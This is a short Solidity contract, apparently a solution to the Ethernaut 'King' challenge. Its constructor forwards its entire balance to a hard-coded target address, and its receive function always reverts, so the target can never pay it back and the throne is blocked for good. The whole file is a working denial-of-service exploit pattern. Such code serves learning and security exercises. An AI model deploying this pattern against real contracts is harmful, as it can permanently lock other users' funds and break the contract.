// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract King {
    constructor() payable {
        uint256 bal = address(this).balance;
        payable(0x4C174d95826A71b4fd1e0a2e3c57e5979209d83E).call{value: bal}(
            ""
        );
    }

    receive() external payable {
        revert();
    }
}
